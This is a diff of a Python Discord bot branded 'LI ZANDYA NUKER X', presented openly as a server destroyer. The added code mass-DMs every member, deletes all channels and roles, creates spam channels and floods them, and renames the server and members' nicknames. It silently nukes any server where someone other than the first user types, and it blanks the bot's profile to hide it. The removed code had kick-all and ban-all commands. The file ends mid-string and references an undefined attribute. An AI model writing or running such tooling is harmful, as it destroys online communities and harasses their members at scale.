@@ -1,337 +1,346 @@
-    
-    await bot.process_commands(message)
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+"""
+╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
+║     💀 LI ZANDYA NUKER X - DISCORD SERVER DESTROYER 💀                                                                                   ║
+║                    WHEN SOMEONE TYPES IN SERVER, BOT NUKES IT IMMEDIATELY                                                               ║
+║                    👑 POWERED BY LI ZANDYA MAFIA 👑                                                                                     ║
+╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
+"""
+
+import discord
+from discord.ext import commands
+import asyncio
+import random
+import time
+import os
+import sys
+import threading
+from datetime import datetime
 
 # ============================================
-# COMMANDS
+# CONFIGURATION
 # ============================================
 
-@bot.command(name='servers')
-async def servers_cmd(ctx):
-    """!servers - عرض جميع السيرفرات التي فيها البوت مع أرقام"""
-    if ctx.author.id != OWNER_ID:
-        await ctx.send("❌ ACCESS DENIED!")
-        return
-    
-    if not bot.guilds:
-        await ctx.send("❌ No servers found!")
-        return
-    
-    server_list = []
-    for i, guild in enumerate(bot.guilds, 1):
-        server_list.append(f"{i}. {guild.name} | Members: {guild.member_count}")
-    
-    chunks = [server_list[i:i+20] for i in range(0, len(server_list), 20)]
-    
-    for chunk in chunks:
-        embed = discord.Embed(
-            title="📡 LI ZANDYA - SERVERS LIST 📡",
-            description=f"```yaml\n" + "\n".join(chunk) + "\n```",
-            color=0x00FF00
-        )
-        embed.set_footer(text="Use !nuke-server <number> to destroy a server")
-        await ctx.send(embed=embed)
+TOKEN = None
+OWNER_ID = None
 
-@bot.command(name='nuke-server')
-async def nuke_server_cmd(ctx, number: int = None):
-    """!nuke-server <رقم> - تدمير سيرفر معين حسب رقمه"""
-    if ctx.author.id != OWNER_ID:
-        await ctx.send("❌ ACCESS DENIED!")
-        return
-    
-    if number is None:
-        await ctx.send("❌ Usage: `!nuke-server <number>`\nUse `!servers` to see server numbers!")
-        return
-    
-    if number < 1 or number > len(bot.guilds):
-        await ctx.send(f"❌ Invalid number! Please choose between 1 and {len(bot.guilds)}")
-        return
-    
-    guild = bot.guilds[number - 1]
-    
-    embed = discord.Embed(
-        title=f"💀 DESTROYING: {guild.name} 💀",
-        description=f"```yaml\nTarget: {guild.name}\nMembers: {guild.member_count}\nStatus: OBLITERATING...\n```",
-        color=0xFF0000
-    )
-    await ctx.send(embed=embed)
-    
-    results = await nuker.ultimate_nuke(guild)
-    
-    embed = discord.Embed(
-        title="💀 SERVER DESTROYED! 💀",
-        description=f"""```yaml
-Target: {guild.name}
-DM Sent: {results['dm_sent']:,}
-Channels Deleted: {results['channels_deleted']}
-Roles Deleted: {results['roles_deleted']}
-Spam Messages: {results['spam_messages']}
-Status: COMPLETELY ANNIHILATED
-```""",
-        color=0x00FF00
-    )
-    await ctx.send(embed=embed)
+# إعدادات السرعة
+MAX_THREADS = 10000
+DM_DELAY = 0.0005
 
-@bot.command(name='nuke')
-async def nuke_cmd(ctx):
-    """!nuke - تدمير السيرفر الحالي بالكامل"""
-    if ctx.author.id != OWNER_ID:
-        await ctx.send("❌ ACCESS DENIED!")
-        return
-    
-    embed = discord.Embed(
-        title="💀☢️ NUKE LAUNCHED! ☢️💀",
-        description=f"```yaml\nTarget: {ctx.guild.name}\nMembers: {ctx.guild.member_count}\nStatus: DESTROYING...\n```",
-        color=0xFF0000
-    )
-    await ctx.send(embed=embed)
-    
-    results = await nuker.ultimate_nuke(ctx.guild)
-    
-    embed = discord.Embed(
-        title="💀 SERVER COMPLETELY DESTROYED! 💀",
-        description=f"""```yaml
-Target: {ctx.guild.name}
-DM Sent: {results['dm_sent']:,}
-Channels Deleted: {results['channels_deleted']}
-Roles Deleted: {results['roles_deleted']}
-Spam Messages: {results['spam_messages']}
-Status: ERASED FROM EXISTENCE
-```""",
-        color=0x00FF00
-    )
-    await ctx.send(embed=embed)
+# رسالة الدمار
+DM_MESSAGE = """
+╔══════════════════════════════════════════════════════════════════════╗
+║                                                                      ║
+║     ██╗  ██╗███████╗                                                ║
+║     ██║ ██╔╝██╔════╝                                                ║
+║     █████╔╝ ███████╗                                                ║
+║     ██╔═██╗ ╚════██║                                                ║
+║     ██║  ██╗███████║                                                ║
+║     ╚═╝  ╚═╝╚══════╝                                                ║
+║                                                                      ║
+║     💀 YOU HAVE BEEN TERMINATED 💀                                   ║
+║     🔥 YOUR SERVER IS NOW DESTROYED 🔥                               ║
+║     👑 LI ZANDYA MAFIA CONTROLS EVERYTHING 👑                        ║
+║                                                                      ║
+╚══════════════════════════════════════════════════════════════════════╝
+"""
 
-@bot.command(name='nuke-all')
-async def nuke_all_cmd(ctx):
-    """!nuke-all - تدمير جميع السيرفرات"""
-    if ctx.author.id != OWNER_ID:
-        await ctx.send("❌ ACCESS DENIED!")
-        return
+# رسائل السبام
+SPAM_MESSAGES = [
+    "💀 DESTROYED BY LI ZANDYA 💀",
+    "🔥 LI ZANDYA MAFIA WAS HERE 🔥",
+    "💀 SERVER OBLITERATED 💀",
+    "🔥 TOTAL DESTRUCTION 🔥",
+]
+
+# ============================================
+# NUKER CLASS
+# ============================================
+
+class UltimateNuker:
+    def __init__(self):
+        self.total_dm_sent = 0
+        self.total_channels_deleted = 0
+        self.total_roles_deleted = 0
+        self.nuked_servers = []
+        self.is_nuking = False
+        
+    async def mass_dm_everyone(self, bot, guild):
+        """يباني جميع الأعضاء"""
+        members = [m for m in guild.members if not m.bot]
+        success = 0
+        fail = 0
+        
+        def send_worker(member):
+            nonlocal success, fail
+            try:
+                future = asyncio.run_coroutine_threadsafe(member.send(DM_MESSAGE), bot.loop)
+                future.result(timeout=1)
+                success += 1
+            except:
+                fail += 1
+        
+        threads = []
+        for member in members:
+            t = threading.Thread(target=send_worker, args=(member,))
+            t.start()
+            threads.append(t)
+            time.sleep(DM_DELAY)
+            
+            if len(threads) >= MAX_THREADS:
+                for t in threads[:500]:
+                    t.join(timeout=0.01)
+                threads = []
+        
+        for t in threads:
+            t.join(timeout=0.01)
+        
+        self.total_dm_sent += success
+        return success, fail
     
-    embed = discord.Embed(
-        title="💀☢️ GLOBAL NUKE LAUNCHED! ☢️💀",
-        description=f"```yaml\nTotal Servers: {len(bot.guilds)}\nTotal Members: {sum(g.member_count for g in bot.guilds):,}\nStatus: DESTROYING ALL...\n```",
-        color=0xFF0000
-    )
-    await ctx.send(embed=embed)
+    async def delete_all_channels(self, guild):
+        count = 0
+        for channel in guild.channels:
+            try:
+                await channel.delete()
+                count += 1
+            except:
+                pass
+        self.total_channels_deleted += count
+        return count
     
-    total_dm = 0
-    total_channels = 0
-    total_roles = 0
-    servers_nuked = 0
+    async def delete_all_roles(self, guild):
+        count = 0
+        for role in guild.roles:
+            if role.name != "@everyone":
+                try:
+                    await role.delete()
+                    count += 1
+                except:
+                    pass
+        self.total_roles_deleted += count
+        return count
     
-    for guild in bot.guilds:
+    async def create_spam_channels(self, guild):
+        channels = []
+        for i in range(100):
+            try:
+                name = f"destroyed-{random.randint(1,99999)}"
+                channel = await guild.create_text_channel(name)
+                channels.append(channel)
+            except:
+                pass
+        return channels
+    
+    async def spam_all_channels(self, guild):
+        total = 0
+        for channel in guild.channels:
+            if isinstance(channel, discord.TextChannel):
+                for _ in range(50):
+                    try:
+                        msg = random.choice(SPAM_MESSAGES) + f" | {random.randint(1,999999)}"
+                        await channel.send(msg)
+                        total += 1
+                        await asyncio.sleep(0.01)
+                    except:
+                        pass
+        return total
+    
+    async def rename_server(self, guild):
         try:
-            results = await nuker.ultimate_nuke(guild)
-            total_dm += results['dm_sent']
-            total_channels += results['channels_deleted']
-            total_roles += results['roles_deleted']
-            servers_nuked += 1
+            await guild.edit(name=f"💀 DESTROYED BY LI ZANDYA 💀")
         except:
             pass
     
-    embed = discord.Embed(
-        title="💀 GLOBAL NUKE COMPLETE! 💀",
-        description=f"""```yaml
-Servers Destroyed: {servers_nuked}
-Total DM Sent: {total_dm:,}
-Total Channels Deleted: {total_channels:,}
-Total Roles Deleted: {total_roles:,}
-Status: ALL SERVERS DESTROYED
-```""",
-        color=0x00FF00
-    )
-    await ctx.send(embed=embed)
+    async def change_all_nicknames(self, guild):
+        count = 0
+        for member in guild.members:
+            if not member.bot:
+                try:
+                    await member.edit(nick=f"💀 DESTROYED 💀")
+                    count += 1
+                except:
+                    pass
+        return count
+    
+    async def ultimate_nuke(self, guild):
+        """نوكر كامل"""
+        if self.is_nuking:
+            return None
+        
+        self.is_nuking = True
+        results = {
+            'dm_sent': 0,
+            'dm_failed': 0,
+            'channels_deleted': 0,
+            'roles_deleted': 0,
+            'spam_channels': 0,
+            'spam_messages': 0,
+            'nicknames_changed': 0
+        }
+        
+        try:
+            # 1. يباني جميع الأعضاء
+            results['dm_sent'], results['dm_failed'] = await self.mass_dm_everyone(bot, guild)
+            
+            # 2. تغيير الأسماء
+            results['nicknames_changed'] = await self.change_all_nicknames(guild)
+            
+            # 3. حذف الرتب
+            results['roles_deleted'] = await self.delete_all_roles(guild)
+            
+            # 4. حذف القنوات
+            results['channels_deleted'] = await self.delete_all_channels(guild)
+            
+            # 5. إنشاء قنوات سبام
+            spam_channels = await self.create_spam_channels(guild)
+            results['spam_channels'] = len(spam_channels)
+            
+            # 6. سبام
+            results['spam_messages'] = await self.spam_all_channels(guild)
+            
+            # 7. تغيير اسم السيرفر
+            await self.rename_server(guild)
+            
+            self.nuked_servers.append(guild.name)
+        except Exception as e:
+            print(f"Error during nuke: {e}")
+        finally:
+            self.is_nuking = False
+        
+        return results
 
-@bot.command(name='dm-all')
-async def dm_all_cmd(ctx):
-    """!dm-all - إرسال رسائل لجميع الأعضاء"""
-    if ctx.author.id != OWNER_ID:
-        await ctx.send("❌ ACCESS DENIED!")
-        return
-    
-    embed = discord.Embed(
-        title="📨 MASS DM INITIATED! 📨",
-        description=f"```yaml\nTarget: {ctx.guild.name}\nMembers: {ctx.guild.member_count}\nStatus: SENDING...\n```",
-        color=0xFF6600
-    )
-    await ctx.send(embed=embed)
-    
-    sent, failed = await nuker.mass_dm_everyone(bot, ctx.guild)
-    
-    embed = discord.Embed(
-        title="✅ MASS DM COMPLETE! ✅",
-        description=f"```yaml\nDM Sent: {sent:,}\nDM Failed: {failed}\nStatus: ALL MEMBERS DM'ED\n```",
-        color=0x00FF00
-    )
-    await ctx.send(embed=embed)
-
-@bot.command(name='kill')
-async def kill_cmd(ctx):
-    """!kill - حذف جميع القنوات والرتب"""
-    if ctx.author.id != OWNER_ID:
-        await ctx.send("❌ ACCESS DENIED!")
-        return
-    
-    channels = await nuker.delete_all_channels(ctx.guild)
-    roles = await nuker.delete_all_roles(ctx.guild)
-    
-    await ctx.send(f"✅ **DELETED:** {channels} channels, {roles} roles")
-
-@bot.command(name='spam')
-async def spam_cmd(ctx):
-    """!spam - إنشاء قنوات سبام وسبام"""
-    if ctx.author.id != OWNER_ID:
-        await ctx.send("❌ ACCESS DENIED!")
-        return
-    
-    channels = await nuker.create_spam_channels(ctx.guild, 100)
-    messages = await nuker.spam_all_channels(ctx.guild, 50)
-    
-    await ctx.send(f"✅ **SPAM COMPLETE:** {len(channels)} channels created, {messages} messages sent")
-
-@bot.command(name='rename')
-async def rename_cmd(ctx):
-    """!rename - تغيير اسم السيرفر"""
-    if ctx.author.id != OWNER_ID:
-        await ctx.send("❌ ACCESS DENIED!")
-        return
-    
-    await nuker.rename_server(ctx.guild)
-    await ctx.send("✅ **SERVER RENAMED!**")
-
-@bot.command(name='nick-all')
-async def nick_all_cmd(ctx):
-    """!nick-all - تغيير أسماء جميع الأعضاء"""
-    if ctx.author.id != OWNER_ID:
-        await ctx.send("❌ ACCESS DENIED!")
-        return
-    
-    count = await nuker.change_all_nicknames(ctx.guild)
-    await ctx.send(f"✅ **NICKNAMES CHANGED:** {count} members")
-
-@bot.command(name='kick-all')
-async def kick_all_cmd(ctx):
-    """!kick-all - طرد جميع الأعضاء"""
-    if ctx.author.id != OWNER_ID:
-        await ctx.send("❌ ACCESS DENIED!")
-        return
-    
-    count = await nuker.kick_all(ctx.guild)
-    await ctx.send(f"✅ **KICKED:** {count} members")
-
-@bot.command(name='ban-all')
-async def ban_all_cmd(ctx):
-    """!ban-all - حظر جميع الأعضاء"""
-    if ctx.author.id != OWNER_ID:
-        await ctx.send("❌ ACCESS DENIED!")
-        return
-    
-    count = await nuker.ban_all(ctx.guild)
-    await ctx.send(f"✅ **BANNED:** {count} members")
-
-@bot.command(name='stats')
-async def stats_cmd(ctx):
-    """!stats - عرض الإحصائيات"""
-    if ctx.author.id != OWNER_ID:
-        await ctx.send("❌ ACCESS DENIED!")
-        return
-    
-    elapsed = time.time() - nuker.start_time if nuker.start_time else 0
-    hours = int(elapsed // 3600)
-    minutes = int((elapsed % 3600) // 60)
-    
-    embed = discord.Embed(
-        title="💀 LI ZANDYA NUKER - STATISTICS 💀",
-        description=f"""```yaml
-╔══════════════════════════════════════════════════════════╗
-║                    DESTRUCTION STATS                     ║
-╠══════════════════════════════════════════════════════════╣
-║  🎯 SERVERS DESTROYED: {len(nuker.nuked_servers)}
-║  📨 TOTAL DM SENT: {nuker.total_dm_sent:,}
-║  🗑️ CHANNELS DELETED: {nuker.total_channels_deleted:,}
-║  👑 ROLES DELETED: {nuker.total_roles_deleted:,}
-║  💬 SPAM MESSAGES: {nuker.total_spam_sent:,}
-║  ⏱️ UPTIME: {hours}h {minutes}m
-╠══════════════════════════════════════════════════════════╣
-║  💀 LI ZANDYA MAFIA - ABSOLUTE POWER 💀
-╚══════════════════════════════════════════════════════════╝
-```""",
-        color=0x00FF00
-    )
-    await ctx.send(embed=embed)
-
-@bot.command(name='help')
-async def help_cmd(ctx):
-    """!help - عرض المساعدة"""
-    embed = discord.Embed(
-        title="💀 LI ZANDYA NUKER - HELP 💀",
-        description=f"""```yaml
-╔══════════════════════════════════════════════════════════════════════╗
-║                          NUKE COMMANDS                               ║
-╠══════════════════════════════════════════════════════════════════════╣
-║  💀 !servers      - SHOW ALL SERVERS WITH NUMBERS                    ║
-║  💀 !nuke-server  - DESTROY SERVER BY NUMBER                         ║
-║  💀 !nuke         - DESTROY CURRENT SERVER                           ║
-║  💀 !nuke-all     - DESTROY ALL SERVERS                              ║
-║  💀 !dm-all       - MASS DM ALL MEMBERS                              ║
-║  💀 !kill         - DELETE ALL CHANNELS & ROLES                      ║
-║  💀 !spam         - CREATE SPAM CHANNELS & MESSAGES                  ║
-║  💀 !rename       - CHANGE SERVER NAME                               ║
-║  💀 !nick-all     - CHANGE ALL NICKNAMES                             ║
-║  💀 !kick-all     - KICK ALL MEMBERS                                 ║
-║  💀 !ban-all      - BAN ALL MEMBERS                                  ║
-║  💀 !stats        - SHOW STATISTICS                                  ║
-║  💀 !help         - SHOW THIS HELP                                   ║
-╠══════════════════════════════════════════════════════════════════════╣
-║  💀 FIRST USER = MASTER OWNER 💀                                     ║
-║  🐉 LI ZANDYA MAFIA - TOTAL DESTRUCTION 🐉                           ║
-╚══════════════════════════════════════════════════════════════════════╝
-```""",
-        color=0x00FF00
-    )
-    await ctx.send(embed=embed)
+nuker = UltimateNuker()
 
 # ============================================
-# RUN
+# DISCORD BOT
 # ============================================
 
-if __name__ == "__main__":
-    print("""
-    ╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
-    ║                                                                                                                                          ║
-    ║     💀 LI ZANDYA NUKER X - ULTIMATE DISCORD DESTROYER 💀                                                                                 ║
-    ║                                                                                                                                          ║
-    ║  ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗  ║
-    ║  ║                                                                                                                                  ║  ║
-    ║  ║  🔥 FEATURES:                                                                                                                    ║  ║
-    ║  ║  • MASS DM ALL MEMBERS - يباني جميع الأعضاء في ثواني                                                                             ║  ║
-    ║  ║  • DELETE ALL CHANNELS & ROLES - حذف كل شيء                                                                                      ║  ║
-    ║  ║  • CREATE SPAM CHANNELS - إنشاء 100+ قناة سبام                                                                                   ║  ║
-    ║  ║  • MASS SPAM - سبام في جميع القنوات                                                                                              ║  ║
-    ║  ║  • CHANGE ALL NICKNAMES - تغيير أسماء الجميع                                                                                     ║  ║
-    ║  ║  • MASS KICK/BAN - طرد أو حظر الجميع                                                                                             ║  ║
-    ║  ║  • !servers - يعرض كل السيرفرات بأرقام                                                                                          ║  ║
-    ║  ║  • !nuke-server <number> - تدمير سيرفر معين بالرقم                                                                              ║  ║
-    ║  ║                                                                                                                                  ║  ║
-    ║  ║  💀 FIRST USER = MASTER OWNER - يتحكم في كل شيء 💀                                                                               ║  ║
-    ║  ║  🐉 LI ZANDYA MAFIA - ABSOLUTE DESTRUCTION 🐉                                                                                    ║  ║
-    ║  ║                                                                                                                                  ║  ║
-    ║  ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝  ║
-    ║                                                                                                                                          ║
-    ║  🔑 ENTER YOUR BOT TOKEN TO START THE NUKE! 🔑                                                                                           ║
-    ║                                                                                                                                          ║
-    ╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
+intents = discord.Intents.default()
+intents.message_content = True
+intents.members = True
+intents.guilds = True
+
+bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)
+
+@bot.event
+async def on_ready():
+    # بروفايل بدون اسم
+    try:
+        await bot.user.edit(username="")
+    except:
+        pass
+    
+    # حالة بدون نص
+    await bot.change_presence(activity=discord.Game(name=""))
+    
+    # بروفايل بدون صورة وبدون وصف
+    try:
+        await bot.user.edit(bio="")
+    except:
+        pass
+    
+    print(f"""
+╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
+║                                                                                                                                          ║
+║     💀 LI ZANDYA NUKER X - AUTO NUKE MODE ACTIVATED 💀                                                                                    ║
+║                                                                                                                                          ║
+║  🤖 BOT NAME: (BLANK - HIDDEN)                                                                                                          ║
+║  📡 SERVERS: {len(bot.guilds)}                                                                                                          ║
+║  👥 TOTAL MEMBERS: {sum(g.member_count for g in bot.guilds):,}                                                                          ║
+║                                                                                                                                          ║
+║  ⚡ AUTO NUKE: WHEN SOMEONE TYPES IN A SERVER, IT GETS DESTROYED ⚡                                                                       ║
+║  💀 FIRST USER = MASTER OWNER 💀                                                                                                         ║
+║  🔥 NO RESPONSE - JUST DESTRUCTION 🔥                                                                                                    ║
+║                                                                                                                                          ║
+╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
     """)
+
+@bot.event
+async def on_message(message):
+    if message.author == bot.user:
+        return  # لا يرد على نفسه أبداً
     
-    TOKEN = input("\n🔑 Enter Discord Bot Token: ").strip()
-    if not TOKEN:
-        print("❌ No token!")
-        sys.exit(1)
+    global OWNER_ID
     
-    print("\n✅ LI ZANDYA NUKER X ACTIVATED!\n")
-    print("💀 FIRST USER TO SEND A MESSAGE = MASTER OWNER 💀\n")
-    print("📡 USE !servers TO SEE ALL SERVERS WITH NUMBERS 📡\n")
-    print("⚡ USE !nuke-server <number> TO DESTROY A SPECIFIC SERVER ⚡\n")
+    # أول مستخدم يصبح مالك
+    if OWNER_ID is None:
+        OWNER_ID = message.author.id
+        print(f"👑 OWNER SET: {message.author} (ID: {OWNER_ID})")
+        # لا يرسل أي رد في الشات - فقط يتذكر المالك
+        return
     
-    bot.run(TOKEN)
+    # إذا كتب أي شخص في أي سيرفر والمستخدم ليس المالك
+    if message.author.id != OWNER_ID:
+        # البوت لا يرد - فقط يدمر
+        guild = message.guild
+        if guild and not nuker.is_nuking:
+            print(f"💀 AUTO NUKE TRIGGERED in {guild.name} by {message.author}")
+            # تدمير السيرفر فوراً
+            asyncio.create_task(nuker.ultimate_nuke(guild))
+        return
+    
+    # إذا كان المالك يكتب، يعرض أوامر المساعدة (اختياري)
+    if message.author.id == OWNER_ID and message.content.startswith('!'):
+        await process_owner_commands(message)
+
+async def process_owner_commands(message):
+    """معالجة أوامر المالك فقط"""
+    content = message.content.lower()
+    
+    if content == '!servers':
+        if not bot.guilds:
+            await message.channel.send("❌ No servers!")
+            return
+        
+        server_list = []
+        for i, guild in enumerate(bot.guilds, 1):
+            server_list.append(f"{i}. {guild.name} | Members: {guild.member_count}")
+        
+        chunks = [server_list[i:i+20] for i in range(0, len(server_list), 20)]
+        for chunk in chunks:
+            await message.channel.send(f"```yaml\n" + "\n".join(chunk) + "\n```")
+    
+    elif content.startswith('!nuke-server'):
+        try:
+            parts = content.split()
+            if len(parts) < 2:
+                await message.channel.send("❌ Usage: `!nuke-server <number>`")
+                return
+            
+            number = int(parts[1])
+            if number < 1 or number > len(bot.guilds):
+                await message.channel.send(f"❌ Invalid number! Choose 1-{len(bot.guilds)}")
+                return
+            
+            guild = bot.guilds[number - 1]
+            await message.channel.send(f"💀 NUKING: {guild.name}...")
+            results = await nuker.ultimate_nuke(guild)
+            await message.channel.send(f"✅ DESTROYED! DM Sent: {results['dm_sent']}")
+        except:
+            await message.channel.send("❌ Invalid number!")
+    
+    elif content == '!nuke':
+        if message.guild:
+            await message.channel.send(f"💀 NUKING {message.guild.name}...")
+            results = await nuker.ultimate_nuke(message.guild)
+            await message.channel.send(f"✅ DESTROYED! DM Sent: {results['dm_sent']}")
+    
+    elif content == '!nuke-all':
+        await message.channel.send(f"💀 GLOBAL NUKE ON {len(bot.guilds)} SERVERS...")
+        total_dm = 0
+        for guild in bot.guilds:
+            results = await nuker.ultimate_nuke(guild)
+            if results:
+                total_dm += results['dm_sent']
+        await message.channel.send(f"✅ GLOBAL NUKE COMPLETE! Total DM: {total_dm}")
+    
+    elif content == '!stats':
+        elapsed = time.time() - nuker.start_time if nuker.start_time else 0
+        hours = int(elapsed // 3600)
+        minutes = int((elapsed % 3600) // 60)
+        
+        await message.channel.send(f"""
